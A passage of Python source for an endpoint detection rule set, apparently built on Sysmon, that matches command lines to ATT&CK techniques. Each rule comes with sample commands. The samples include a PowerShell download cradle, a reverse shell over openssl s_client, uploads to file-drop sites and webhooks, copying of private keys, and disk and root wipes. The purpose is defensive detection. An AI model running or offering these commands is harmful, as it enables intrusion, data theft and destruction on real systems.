        ("/usr/bin/docker", "docker run --rm --security-opt no-new-privileges:true alpine id")]),
    _l("T1609", "docker podman nerdctl",
       r"\bexec\b.*\b(nsenter|chroot|mount|insmod|modprobe)\b|\bexec\b.*base64\s+(-d|--decode)", "high",
       "command executed inside a container that enters namespaces, mounts, or loads modules",
       ("/usr/bin/docker", "docker exec -it app nsenter -t 1 -m -u -i -n sh"),
       [("/usr/bin/docker", "docker exec -it app sh"), ("/usr/bin/docker", "docker exec db psql -U app")]),
    _l("T1133 T1552", "dockerd docker",
       r"(-H|--host)[= ]?tcp://(?!127\.0\.0\.1|localhost|\[::1\])", "critical",
       "Docker API exposed over TCP without the loopback address",
       ("/usr/bin/dockerd", "dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock"),
       [("/usr/bin/dockerd", "dockerd -H fd:// --containerd=/run/containerd/containerd.sock"),
        ("/usr/bin/docker", "docker -H tcp://127.0.0.1:2375 ps")]),

    # ── lateral movement, tunnelling and proxies ────────────────────────────
    _w("T1090", "netsh", r"interface\s+portproxy\s+add\b", "high", "port proxy rule added",
       (S32 + "netsh.exe",
        "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.5 connectport=3389"),
       [(S32 + "netsh.exe", "netsh interface portproxy show all")]),
    Rule(("T1572", "T1090"), WIN, ("chisel", "ngrok", "frpc", "plink", "ligolo-agent", "iodine"),
         r"\S", "high", "tunnelling tool started",
         (r"C:\t\chisel.exe", "chisel.exe client 203.0.113.9:443 R:socks")),
    Rule(("T1572", "T1090"), LINUX, ("chisel", "ngrok", "frpc", "ligolo-agent", "iodine", "dnscat"),
         r"\S", "high", "tunnelling tool started",
         ("/tmp/chisel", "chisel client 203.0.113.9:443 R:socks")),
    _l("T1572", "ssh", r"(^|\s)-(R|D)\s*\S+|(^|\s)-w\s*\d", "medium",
       "SSH remote or dynamic port forward",
       ("/usr/bin/ssh", "ssh -N -R 2222:localhost:22 u@203.0.113.9"),
       [("/usr/bin/ssh", "ssh -L 5432:db:5432 u@bastion"), ("/usr/bin/ssh", "ssh u@host uptime")]),
    # Windows has OpenSSH built in, and 2025-2026 intrusions (OkoBot, TerminalFix)
    # use it for reverse tunnels and SOCKS pivots (spyware research 2026-10-29).
    _w("T1572", "ssh", r"(^|\s)-R\s*\S+|(^|\s)-w\s*\d", "medium",
       "SSH remote port forward or tun device from Windows",
       (S32 + r"OpenSSH\ssh.exe", "ssh.exe -N -R 2222:localhost:3389 u@203.0.113.9"),
       [(S32 + r"OpenSSH\ssh.exe", "ssh.exe -L 5432:db:5432 u@bastion"),
        (S32 + r"OpenSSH\ssh.exe", "ssh.exe u@host uptime")]),
    _w("T1090", "ssh", r"(^|\s)-D\s*\S+", "low",
       "SSH SOCKS proxy (dynamic forward) from Windows",
       (S32 + r"OpenSSH\ssh.exe", "ssh.exe -N -D 1080 u@203.0.113.9"),
       [(S32 + r"OpenSSH\ssh.exe", "ssh.exe -T -o ConnectTimeout=15 host bash")]),
    _l("T1090", "socat", r"TCP\d?-LISTEN:\d+[^ ]*fork\S*\s+TCP\d?:", "medium",
       "socat relaying a listener to another host",
       ("/usr/bin/socat", "socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389")),

    # ── collection and exfiltration ─────────────────────────────────────────
    _w("T1560", "7z 7za 7zr rar winrar", r"\ba\b.*\s-(p|hp)\S+", "medium",
       "password-protected archive created",
       (r"C:\Program Files\7-Zip\7z.exe", r"7z a -pS3cret C:\t\out.7z C:\Users\u\Documents"),
       [(r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\t\out.7z C:\src")], quiet=True),
    _l("T1560", "zip 7z 7za", r"(^|\s)-(e|P\s*\S+|p\S+)\b", "medium",
       "password-protected archive created",
       ("/usr/bin/zip", "zip -r -P s3cret /tmp/out.zip /home/u/Documents"),
       [("/usr/bin/zip", "zip -r out.zip src")], quiet=True),
    # Low: image paste in terminal tools reads the clipboard this way
    # (measured: 8 benign hits in 256k process starts, none malicious).
    _w("T1115", "powershell pwsh", r"\bGet-Clipboard\b", "low",
       "clipboard read from PowerShell",
       (PS, "powershell -c Get-Clipboard | Out-File C:\\t\\c.txt"),
       [(PS, "powershell -c Set-Clipboard -Value done")]),
    _l("T1115", "xclip xsel wl-paste", r"(^|\s)(-o|--output|-selection\s+\w+\s+-o)\b|^\S*wl-paste\b",
       "medium", "clipboard read from a command line",
       ("/usr/bin/xclip", "xclip -selection clipboard -o"),
       [("/usr/bin/xclip", "xclip -selection clipboard -i notes.txt")]),
    _l("T1113", "scrot gnome-screenshot grim maim xwd import flameshot spectacle", r"", "medium",
       "screenshot tool run from a command line",
       ("/usr/bin/scrot", "scrot /tmp/s.png")),
    _w("T1113", "powershell pwsh", r"\bCopyFromScreen\b", "medium",
       "screen captured from PowerShell",
       (PS, "powershell -c $g.CopyFromScreen(0,0,0,0,$b.Size)")),
    _l("T1123", "arecord parecord parec", r"", "medium", "audio recorded from a command line",
       ("/usr/bin/arecord", "arecord -d 30 /tmp/a.wav")),
    Rule(("T1123",), WIN, ("ffmpeg",), r"-f\s+dshow\b[^|;&]*audio=", "medium",
         "microphone recorded with ffmpeg",
         (r"C:\t\ffmpeg.exe", 'ffmpeg -f dshow -i audio="Microphone" C:\\t\\a.wav'),
         ((r"C:\t\ffmpeg.exe", r"ffmpeg -i in.mp4 out.webm"),)),
    Rule(("T1125",), WIN, ("ffmpeg",), r"-f\s+dshow\b[^|;&]*video=", "medium",
         "camera recorded with ffmpeg",
         (r"C:\t\ffmpeg.exe", 'ffmpeg -f dshow -i video="Integrated Camera" C:\\t\\v.mp4')),
    _l("T1125", "ffmpeg fswebcam streamer", r"/dev/video\d|-f\s+v4l2\b|^\S*fswebcam\b", "medium",
       "camera recorded from a command line",
       ("/usr/bin/ffmpeg", "ffmpeg -f v4l2 -i /dev/video0 /tmp/v.mp4"),
       [("/usr/bin/ffmpeg", "ffmpeg -i in.mp4 out.webm")]),
    _w("T1040", "pktmon", r"\bstart\b", "medium", "packet capture started with pktmon",
       (S32 + "PktMon.exe", "pktmon start --capture"), [(S32 + "PktMon.exe", "pktmon status")]),
    _w("T1040", "netsh", r"trace\s+start\b[^|;&]*capture\s*=\s*yes", "medium",
       "packet capture started with netsh trace",
       (S32 + "netsh.exe", "netsh trace start capture=yes tracefile=C:\\t\\n.etl")),
    _l("T1040", "tcpdump tshark dumpcap", r"", "medium", "packet capture tool started",
       ("/usr/bin/tcpdump", "tcpdump -i eth0 -w /tmp/c.pcap")),
    _l("T1046", "nmap masscan zmap rustscan nbtscan", r"", "medium", "network scanner started",
       ("/usr/bin/nmap", "nmap -sS -p- 10.0.0.0/24")),
    Rule(("T1046",), WIN, ("nmap", "masscan", "rustscan", "nbtscan"), r"", "medium",
         "network scanner started",
         (r"C:\Program Files (x86)\Nmap\nmap.exe", "nmap -sS -p- 10.0.0.0/24")),
    _w("T1482", "nltest", r"/(domain_trusts|trusted_domains|dclist)\b", "medium",
       "domain trust enumeration",
       (S32 + "nltest.exe", "nltest /domain_trusts /all_trusts")),
    Rule(("T1114",), WIN, POWERSHELL,
         r"\b(New-MailboxExportRequest|Export-Mailbox|Get-Mailbox\s[^|;]*\|\s*Export)", "high",
         "mailbox export from PowerShell",
         (PS, r"powershell -c New-MailboxExportRequest -Mailbox u -FilePath \\h\s\u.pst")),
    _l("T1048", "curl", r"(^|\s)(-T|--upload-file)\s+\S+.*\b(ftp|sftp|scp|tftp)://", "medium",
       "file uploaded over FTP-family protocol",
       ("/usr/bin/curl", "curl -T /home/u/db.sql ftp://203.0.113.9/in/"),
       [("/usr/bin/curl", "curl -fsSL https://example.com/install.sh")]),
    _w("T1048", "ftp tftp", r"(^|\s)-s:\S+|\bput\b|(^|\s)-i\s+\S+\s+put\b", "medium",
       "scripted FTP or TFTP upload",
       (S32 + "ftp.exe", r"ftp -s:C:\t\cmds.txt 203.0.113.9")),
    Rule(("T1567",), WIN, ANY,
         r"\b(transfer\.sh|file\.io|0x0\.st|gofile\.io|anonfiles\.com|temp\.sh|bashupload\.com"
         r"|discord(app)?\.com/api/webhooks|api\.telegram\.org/bot\w+:[\w-]+/send)\b", "high",
         "upload to a file-drop or chat webhook service",
         (S32 + "curl.exe", r"curl -F file=@C:\t\out.7z https://file.io"),
         not_images=BROWSERS + POWERSHELL),
    Rule(("T1567",), LINUX, ANY,
         r"\b(transfer\.sh|file\.io|0x0\.st|gofile\.io|anonfiles\.com|temp\.sh|bashupload\.com"
         r"|discord(app)?\.com/api/webhooks|api\.telegram\.org/bot\w+:[\w-]+/send)\b", "high",
         "upload to a file-drop or chat webhook service",
         ("/usr/bin/curl", "curl --upload-file /tmp/out.tgz https://transfer.sh/out.tgz"),
         (("/usr/bin/bash", "bash -c 'grep transfer.sh notes.md'"),),
         not_images=BROWSERS + INTERPRETERS),
    Rule(("T1567",), LINUX, ("rclone",), r"\b(copy|sync|move)\b\s+\S+\s+\w[\w-]*:", "high",
         "rclone copying to a cloud remote",
         ("/usr/bin/rclone", "rclone copy /home/u/Documents remote:bucket/x")),
    Rule(("T1567",), WIN, ("rclone",), r"\b(copy|sync|move)\b\s+\S+\s+\w[\w-]*:", "high",
         "rclone copying to a cloud remote",
         (r"C:\t\rclone.exe", r"rclone copy C:\Users\u\Documents remote:bucket/x")),

    # ── impact ──────────────────────────────────────────────────────────────
    _w("T1489", "sc net net1",
       r"\b(stop|delete)\b[^|;&]*\b(vss|sql\w*|mssql\S*|veeam\S*|backup\S*|wbengine|msexchange\S*"
       r"|sophos\S*|oracle\S*|mysql\S*|postgres\S*)\b", "high",
       "backup or database service stopped",
       (S32 + "net.exe", "net stop VSS /y"),
       [(S32 + "net.exe", "net start"), (S32 + "sc.exe", "sc query vss")]),
    _l("T1489", "systemctl service",
       r"\b(stop|disable|mask)\b[^|;&]*\b(mysql|mariadb|postgresql|mongod|redis\S*|docker|veeam\S*"
       r"|bacula\S*)\b", "medium", "backup or database service stopped",
       ("/usr/bin/systemctl", "systemctl stop postgresql"),
       [("/usr/bin/systemctl", "systemctl status postgresql")]),
    _w("T1485", "sdelete sdelete64", r"\S+\s+\S", "high", "secure deletion with SDelete",
       (r"C:\Tools\sdelete64.exe", r"sdelete64.exe -p 3 -s C:\Users\u\Documents")),
    _w("T1485", "cipher", r"/w:", "high", "free space overwritten with cipher /w",
       (S32 + "cipher.exe", r"cipher /w:C:\Users\u"), [(S32 + "cipher.exe", "cipher /c file.txt")]),
    _l("T1485", "shred", r"\S+\s+\S", "medium", "file overwritten with shred",
       ("/usr/bin/shred", "shred -u -n 3 /home/u/notes.txt")),
    _l("T1485", "rm", r"--no-preserve-root\b|(^|\s)-\w*r\w*f?\w*\s+(/|/\*|/home|/etc|/var|/usr|/boot)\s*$",
       "critical", "recursive delete of a system root",
       ("/usr/bin/rm", "rm -rf --no-preserve-root /"),
       [("/usr/bin/rm", "rm -rf /tmp/build"), ("/usr/bin/rm", "rm -rf ./node_modules")]),
    _l("T1561", "dd", r"\bof=/dev/(sd|nvme|vd|hd|xvd|mmcblk)\w*", "critical",
       "raw write to a disk device",
       ("/usr/bin/dd", "dd if=/dev/zero of=/dev/sda bs=1M"),
       [("/usr/bin/dd", "dd if=/dev/sda of=/tmp/disk.img"),
        ("/usr/bin/dd", "dd if=/dev/zero of=/tmp/swapfile bs=1M count=64")]),
    _l("T1561", "wipefs", r"(^|\s)(-a|--all)\b", "critical", "filesystem signatures wiped",
       ("/usr/sbin/wipefs", "wipefs -a /dev/sdb"), [("/usr/sbin/wipefs", "wipefs /dev/sdb")]),
    _w("T1561", "format", r"\b[a-z]:\s.*(/q|/y|/p:\d)", "high", "volume formatted without a prompt",
       (S32 + "format.com", "format D: /fs:ntfs /q /y")),
    _w("T1529", "shutdown", r"/(s|r|p)\b[^|;&]*/f\b|/f\b[^|;&]*/(s|r|p)\b", "medium",
       "forced shutdown or restart from a command line",
       (S32 + "shutdown.exe", "shutdown /r /f /t 0"),
       [(S32 + "shutdown.exe", "shutdown /a"), (S32 + "shutdown.exe", "shutdown /s /t 3600")]),
    _w("T1531", "net net1", r"\buser\b\s+\S+\s+.*(/delete\b|/active:no\b)", "high",
       "local account deleted or disabled",
       (S32 + "net.exe", "net user alice /delete"), [(S32 + "net.exe", "net user alice")]),
    _l("T1531", "userdel", r"\S+\s+\S", "medium", "account deleted",
       ("/usr/sbin/userdel", "userdel -r alice")),
    _l("T1531", "passwd usermod", r"(^|\s)(-l|-L|--lock)\b", "medium", "account locked",
       ("/usr/bin/passwd", "passwd -l alice"), [("/usr/bin/passwd", "passwd -S alice")]),
    Rule(("T1496",), WIN, ANY, r"stratum\+(tcp|ssl|tls)://|--donate-level\b|\bxmrig\b", "high",
         "cryptocurrency miner command line",
         (r"C:\t\svc.exe", "svc.exe -o stratum+tcp://pool.example:3333 -u w -p x")),
    Rule(("T1496",), LINUX, ANY, r"stratum\+(tcp|ssl|tls)://|--donate-level\b|\bxmrig\b", "high",
         "cryptocurrency miner command line",
         ("/tmp/kworkerd", "kworkerd -o stratum+tcp://pool.example:3333 -u w -p x"),
         not_images=INTERPRETERS),
    _w("T1653", "powercfg",
       r"/(change|x)\s+(standby|hibernate)-timeout-(ac|dc)\s+0\b", "medium",
       "sleep or hibernate timeout disabled",
       (S32 + "powercfg.exe", "powercfg /change standby-timeout-ac 0"),
       [(S32 + "powercfg.exe", "powercfg /a"), (S32 + "powercfg.exe", "powercfg /batteryreport")]),
)


# ── a program starting something it has no business starting ────────────────
# Keyed on the parent as well as the child. These report the visible effect of
# an exploit or a malicious document, not the exploit: the vulnerable code path
# itself is never observed.
SCRIPT_CHILDREN = ("cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32",
                   "regsvr32", "certutil", "bitsadmin", "msiexec")
# PowerShell on the event stream (2026-10-27 coverage audit). The most common
# living-off-the-land procedure was caught only by the 2-minute process
# snapshot or an unusual parent. Measured over 3 days (16581 PowerShell
# starts): no download-and-execute or remote transfer outside ARGUS-INSTINCT's own
# loopback calls to its local model, and 5 encoded commands, all ARGUS-INSTINCT's own
# tooling via WSL. Encoded is therefore medium (obfuscation, not proof); the
# parent cannot lower it safely because anything from WSL looks the same.
_PS = S32 + "WindowsPowerShell\\v1.0\\powershell.exe"
_DOWNLOAD = (r"downloadstring|downloaddata|downloadfile|net\.webclient|invoke-webrequest"
             r"|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer")
_REMOTE_URL = r"https?://(?!(?:127\.\d+\.\d+\.\d+|localhost|\[::1\])[:/])"
_JARVIS_MODEL = (_PS, "powershell.exe -NoProfile -NonInteractive -Command \"try{$r=Invoke-RestMethod "
                      "-Uri 'http://127.0.0.1:11434/api/tags' -TimeoutSec 5}catch{}\"")
RULES += (
    _w("T1059 T1105", "powershell pwsh",
       r"(\biex\b|invoke-expression)[\s\S]{0,400}?(" + _DOWNLOAD + r"|https?://)"
       r"|(" + _DOWNLOAD + r")[\s\S]{0,400}?(\biex\b|invoke-expression)",
       "high", "PowerShell downloads and runs code (download cradle)",
       (_PS, "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
             ".DownloadString('http://203.0.113.9/a.ps1')\""),
       [_JARVIS_MODEL, (_PS, "powershell -c \"Invoke-Expression $env:LocalScript\"")]),
    _w("T1059 T1027", "powershell pwsh",
       r"(^|\s)[-/]e(c|n|nc|nco|ncod|ncode|ncoded|ncodedc|ncodedco|ncodedcom|ncodedcomm"
       r"|ncodedcomma|ncodedcomman|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}",
       "medium", "PowerShell ran an encoded command (contents hidden from the command line)",
       (_PS, "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
       [(_PS, "powershell -ExecutionPolicy Bypass -File C:\\t\\setup.ps1"),
        (_PS, "powershell -ep bypass -file build.ps1")]),
    # Steps aside when the same command executes what it fetched: the cradle
    # rule above reports that, and one event should be one finding.
    _w("T1105", "powershell pwsh",
       r"^(?![\s\S]*(\biex\b|invoke-expression))[\s\S]*?(" + _DOWNLOAD
       + r"|uploadfile|uploadstring)[\s\S]{0,300}?" + _REMOTE_URL,
       "medium", "PowerShell transfers data to or from a remote host",
       (_PS, "powershell -c \"Invoke-WebRequest https://203.0.113.9/p.exe -OutFile $env:TEMP\\\\p.exe\""),
       [_JARVIS_MODEL]),
    _w("T1567", "powershell pwsh",
       r"\b(transfer\.sh|file\.io|0x0\.st|gofile\.io|anonfiles\.com|temp\.sh|bashupload\.com"
       r"|discord(app)?\.com/api/webhooks|api\.telegram\.org/bot\w+:[\w-]+/send)\b", "high",
       "PowerShell talks to a file-drop or chat webhook service",
       (_PS, "powershell -c \"Invoke-RestMethod -Uri https://discord.com/api/webhooks/1/x "
             "-Method Post -InFile $env:TEMP\\\\k.txt\""),
       [(_PS, "powershell -c \"Start-Process https://discord.com/app\"")]),
)

# System utilities whose renamed copies are an evasion step in themselves
# (T1036.003): every rule matches on the image name, so a renamed copy slipped
# past all of them. Sysmon records the file's original name. Measured over
# 3 days: 25034 runs of these utilities, none under another name.
RENAMED_WATCH = frozenset((
    "powershell", "pwsh", "cmd", "mshta", "rundll32", "regsvr32", "certutil", "bitsadmin",
    "wmic", "msbuild", "installutil", "cscript", "wscript", "curl", "schtasks", "net", "net1",
    "reg", "sc", "msiexec", "forfiles", "wsl", "bash", "psexec", "procdump", "rclone"))


def original_base(name):
    """Sysmon OriginalFileName -> the base the rules use (`PowerShell.EXE`,
    `pwsh.dll` -> `powershell`, `pwsh`)."""
    base = image_base(name)
    return base[:-4] if base.endswith((".dll", ".mui")) else base


DOCUMENT_APPS = ("winword", "excel", "powerpnt", "outlook", "onenote", "msaccess", "mspub",
                 "visio", "acrord32", "acrobat", "foxitreader", "foxitpdfreader", "wordpad",
                 "eqnedt32")
WINDOWS_SERVERS = ("w3wp", "httpd", "nginx", "tomcat", "tomcat9", "tomcat10", "php-cgi",
                   "sqlservr")

RULES += (
    Rule(("T1203",), WIN, SCRIPT_CHILDREN, r"\S", "high",
         "a document application started a script host or system tool (the effect of an exploit or macro)",
         (S32 + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell -nop -c iex $env:x"),
         ((S32 + "cmd.exe", "cmd /c dir"),),        # same child, ordinary parent
         parents=DOCUMENT_APPS,
         sample_parent=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    Rule(("T1190", "T1505"), WIN, ("cmd", "powershell", "pwsh"), r"\S", "critical",
         "a server process started a shell (the effect of an exploited service)",
         (S32 + "cmd.exe", "cmd.exe /c whoami"),
         ((S32 + "cmd.exe", "cmd /c dir"),),
         parents=WINDOWS_SERVERS, sample_parent=r"C:\Windows\System32\inetsrv\w3wp.exe"),
    Rule(("T1068",), WIN, ("cmd", "powershell", "pwsh"), r"\S", "critical",
         "the print spooler or LSASS started a shell",
         (S32 + "cmd.exe", "cmd.exe /c whoami"),
         ((S32 + "cmd.exe", "cmd /c dir"),),
         parents=("spoolsv", "lsass"), sample_parent=S32 + "spoolsv.exe"),
    _w("T1649", "certutil", r"-exportpfx\b", "high",
       "certificate and private key exported with certutil",
       (S32 + "certutil.exe", "certutil -exportPFX -p x My 01ab c:\\t\\c.pfx"),
       [(S32 + "certutil.exe", "certutil -store My")], quiet=True),
    Rule(("T1649",), WIN, ANY, r"\bcrypto::(certificates|capi|cng|keys)\b", "critical",
         "Mimikatz certificate export syntax",
         (r"C:\t\m.exe", 'm.exe "crypto::capi" "crypto::certificates /export" exit')),
)


# Where a mail client or an archive tool unpacks something the user opened.
_OPENED_FROM = (r"(\\Content\.Outlook\\|\\Temp\\(Temp\d*_[^\\\"]+\.zip|7z[0-9A-Za-z]{4,}|Rar\$[^\\\"]+"
                r"|[^\\\"]+\.zip\.[0-9a-f]{3})\\)[^\"]*\.")
_SCRIPT_TYPES = r"(js|jse|vbs|vbe|wsf|wsh|hta|lnk|scr|pif|bat|cmd|ps1|iso|img|dll)\b"

RULES += (
    # The visible end of a phishing lure: something run straight out of an
    # attachment cache or an archive. Reported as that effect; the message
    # that delivered it is never seen.
    Rule(("T1566", "T1204"), WIN, ANY, _OPENED_FROM + _SCRIPT_TYPES, "high",
         "script or shortcut run from a mail attachment or an archive (the effect of a lure)",
         (S32 + "wscript.exe",
          r'wscript.exe "C:\Users\u\AppData\Local\Temp\Temp1_invoice.zip\invoice.js"'),
         ((S32 + "wscript.exe", r'wscript.exe "C:\Users\u\Documents\tools\build.js"'),
          (S32 + "notepad.exe", r'notepad.exe "C:\Users\u\AppData\Local\Temp\Temp1_notes.zip\readme.txt"'))),
    Rule(("T1566", "T1204"), WIN, ANY, _OPENED_FROM + r"(exe|msi|com)\b", "medium",
         "program run from a mail attachment or an archive (the effect of a lure)",
         (r"C:\Users\u\AppData\Local\Temp\Temp1_update.zip\update.exe",
          r'"C:\Users\u\AppData\Local\Temp\Temp1_update.zip\update.exe"'),
         ((r"C:\Users\u\Downloads\setup.exe", r'"C:\Users\u\Downloads\setup.exe" /S'),)),
    Rule(("T1189",), WIN, ("powershell", "pwsh", "mshta", "wscript", "cscript", "regsvr32",
                           "certutil", "bitsadmin"), r"\S", "high",
         "a web browser started a script host (a possible effect of a drive-by)",
         (PS, "powershell -nop -w hidden -c iex $x"),
         ((PS, "powershell -c Get-Date"),),       # same child, ordinary parent
         parents=BROWSERS, sample_parent=r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    _w("T1563", "tscon", r"\d+\s+/dest:", "high", "one desktop session connected to another with tscon",
       (S32 + "tscon.exe", "tscon 2 /dest:rdp-tcp#0"),
       [(S32 + "tscon.exe", "tscon /?")]),
    _w("T1484", "powershell pwsh",
       r"\b(New-GPO|Set-GPRegistryValue|New-GPLink|Set-GPLink|Set-GPPermission|Import-GPO)\s", "medium",
       "Group Policy object created, linked or changed from PowerShell",
       (PS, "powershell -c New-GPLink -Name Updates -Target 'dc=corp,dc=local'"),
       [(PS, "powershell -c Get-GPO -All")]),
    Rule(("T1207",), WIN, ANY, r"\blsadump::dcshadow\b", "critical",
         "Mimikatz DCShadow syntax",
         (r"C:\t\m.exe", 'm.exe "lsadump::dcshadow /object:u /attribute:primaryGroupID /value:512"')),
    Rule(("T1606",), WIN, ANY,
         r"\b(New-AADIntSAMLToken|Export-AADIntADFSSigningCertificate|Open-AADIntOffice365Portal"
         r"|ADFSDump(\.exe)?)\b", "critical", "token-forging tool syntax",
         (PS, "powershell -c New-AADIntSAMLToken -ImmutableID x -Issuer y -PfxFileName z"), quiet=True),
)


# ── collection, staging and exfiltration shape ──────────────────────────────
# What these see is the command that gathers or moves the data, never the data.
_DOC_TYPES = r"\*\.(docx?|xlsx?|pptx?|pdf|kdbx|pst|odt|rtf)\b"
_UPLOAD = (r"(curl(\.exe)?\s([^|;&]*\s)?(-T|--upload-file|-F|--data-binary)\b|rclone(\.exe)?\s+(copy|sync|move)\b"
           r"|\bscp(\.exe)?\s|\bpscp(\.exe)?\s|bitsadmin(\.exe)?\s[^|;&]*/upload\b|\bwinscp\S*\s"
           r"|aws(\.exe)?\s+s3\s+(cp|sync|mv)\b|-InFile\b|\.UploadFile\()")
_KEY_FILES = (r"(\.kdbx\b|\bwallet\.dat\b|[\\/]\.ssh[\\/]id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub)"
              r"|[\\/]\.aws[\\/]credentials\b|[\\/]\.gnupg[\\/]\S*(secring|private-keys)|\.ppk\b)")
_STAGING = r"[a-z]:\\(Users\\Public|ProgramData|Windows\\Temp|\$Recycle\.Bin|PerfLogs)\\"

RULES += (
    _w("T1039", "xcopy robocopy",
       r"^(\"[^\"]+\"|\S+)\s+\"?\\\\[\w.-]+\\(?!(admin|ipc|[a-z])\$)[^\s\"]+", "low",
       "files copied from a network share with a copy tool",
       (S32 + "Robocopy.exe", r"robocopy \\fs01\finance\reports C:\Users\u\AppData\Local\Temp\r /e"),
       [(S32 + "Robocopy.exe", r"robocopy C:\src D:\backup /mir"),
        (S32 + "Robocopy.exe", r"robocopy C:\src \\nas\backup\src /mir")]),
    _l("T1039", "smbget smbclient", r"^\S*smbget\s+\S*smb://|-c\s+[\"'][^\"']*\b(m?get|recurse)\b", "low",
       "files fetched from a network share with an SMB client",
       ("/usr/bin/smbclient", "smbclient //fs01/finance -U u -c 'recurse; mget *'"),
       [("/usr/bin/smbclient", "smbclient -L //fs01 -N")], quiet=True),
    _w("T1119", "cmd", r"\bfor\s+/r\b.*\(\s*" + _DOC_TYPES + r".*\)\s*do\s+@?(copy|xcopy|move|type)\b", "medium",
       "one command collecting document files recursively",
       (S32 + "cmd.exe", r"cmd /c for /r C:\Users %f in (*.docx *.pdf) do copy %f C:\Users\Public\c"),
       [(S32 + "cmd.exe", r"cmd /c for /r . %f in (*.obj) do del %f")]),
    _w("T1119", "powershell pwsh",
       r"\b(Get-ChildItem|gci|ls|dir)\b[^|]*-Recurse\b[^|]*" + _DOC_TYPES
       + r"[^|]*\|.*\b(Copy-Item|Compress-Archive|Move-Item)\b", "medium",
       "one command collecting document files recursively",
       (PS, r"powershell -c Get-ChildItem C:\Users -Recurse -Include *.docx,*.pdf | Copy-Item -Destination C:\t"),
       [(PS, r"powershell -c Get-ChildItem . -Recurse -Include *.cs | Select-String TODO"),
        (PS, r"powershell -c Get-ChildItem C:\docs -Recurse -Include *.pdf | Measure-Object")]),
    _l("T1119", "find",
       r"-i?name\s+[\"']?" + _DOC_TYPES + r".*-exec\s+(cp|mv|tar|zip|scp|rsync|cat)\b", "medium",
       "one command collecting document files recursively",
       ("/usr/bin/find", "find /home -name '*.pdf' -exec cp {} /dev/shm/c ;"),
       [("/usr/bin/find", "find . -name '*.pyc' -exec rm {} ;"),
        ("/usr/bin/find", "find /home -name '*.pdf' -newer x")]),
    _w("T1005", "xcopy robocopy esentutl cmd powershell pwsh",
       r"\b(copy|xcopy|robocopy|Copy-Item|cpi|esentutl(\.exe)?\s+/y)\b[^|;&]*" + _KEY_FILES, "medium",
       "private key, password database or wallet file copied with a copy tool",
       (S32 + "cmd.exe", r"cmd /c copy C:\Users\u\Documents\vault.kdbx C:\Users\Public\v"),
       [(S32 + "cmd.exe", r"cmd /c copy C:\Users\u\.ssh\id_ed25519.pub C:\t\k"),
        (S32 + "cmd.exe", r"cmd /c type C:\Users\u\notes.txt")], quiet=True),
    _l("T1005", "cp tar zip scp rsync 7z", r"[^|;&]*" + _KEY_FILES, "medium",
       "private key, password database or wallet file copied with a copy tool",
       ("/usr/bin/cp", "cp /home/u/.ssh/id_ed25519 /dev/shm/k"),
       [("/usr/bin/cp", "cp /home/u/.ssh/id_ed25519.pub /tmp/k"),
        ("/usr/bin/cp", "cp /home/u/.ssh/config /tmp/c")], quiet=True),
    _w("T1029 T1053", "schtasks", r"/create\b.*/tr\s+.*" + _UPLOAD, "high",
       "scheduled task created whose action uploads data",
       (S32 + "schtasks.exe",
        r'schtasks /create /tn Sync /sc hourly /tr "curl.exe -T C:\Users\Public\a.zip https://x.example/u"'),
       [(S32 + "schtasks.exe", r'schtasks /create /tn Backup /sc daily /tr "C:\Tools\backup.cmd"')], quiet=True),
    _l("T1029 T1053", " ".join(SHELLS),
       r"((\*|\d+)(/\d+)?\s+){4}(\*|\d+)\s+[^|\n]*" + _UPLOAD + r"[^\n]*\|\s*crontab\b"
       r"|systemd-run\b[^|;&]*--on-(calendar|unit-active|boot)\S*\s[^|;&]*" + _UPLOAD, "high",
       "recurring job created whose action uploads data",
       ("/usr/bin/bash", "bash -c \"echo '0 * * * * curl -T /tmp/a.tgz https://x.example/u' | crontab -\""),
       [("/usr/bin/bash", "bash -c \"echo '0 3 * * * /usr/local/bin/backup.sh' | crontab -\"")], quiet=True),
    _l("T1132", " ".join(SHELLS),
       r"\b(base64|xxd|uuencode)\b(?!\s+(-d|--decode|-D|-r)\b)[^|;&\\]*\|\s*([^;&\\]*(?<!\\)\|\s*)?(curl|wget|nc|ncat|socat)\s"
       r"|\b(curl|wget)\b[^|;&]*\$\(\s*(base64|xxd)\b(?!\s+(-d|--decode|-D|-r)\b)", "medium",
       "data encoded and handed straight to a network tool",
       ("/usr/bin/bash", "bash -c 'tar cz /home/u/docs | base64 -w0 | curl -d @- https://x.example/p'"),
       [("/usr/bin/bash", "bash -c 'curl -s https://x.example/k.b64 | base64 -d > k.bin'"),
        ("/usr/bin/bash", "bash -c 'base64 -w0 logo.png > logo.b64'"),
        # an alternation in a search pattern is not a pipeline (measured: this fired once)
        ("/usr/bin/bash", "bash -c 'grep -n \"base64\\|s_client\\|ncat\\|socat\" rules.py | head'")], quiet=True),
    _w("T1132", "powershell pwsh",
       r"ToBase64String\b.*\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm|UploadString|UploadData)\b"
       r"|\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b[^|;]*ToBase64String\b", "medium",
       "data encoded and handed straight to a web request",
       (PS, r"powershell -c $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\t\a.zip')); "
            r"Invoke-RestMethod https://x.example/p -Method Post -Body $b"),
       [(PS, r"powershell -c [Convert]::ToBase64String([IO.File]::ReadAllBytes('a.png')) | Set-Content a.b64")],
       quiet=True),
    _l("T1573 T1059", " ".join(SHELLS),
       r"\b(ba|da|z)?sh\b\s+-i\b[^|;]*\|\s*openssl\s+s_client\b|openssl\s+s_client\b[^|;]*\|\s*(/bin/)?(ba|da|z)?sh\b",
       "high", "interactive shell carried over a TLS client",
       ("/usr/bin/bash",
        "bash -c 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 198.51.100.7:443 > /tmp/s'"),
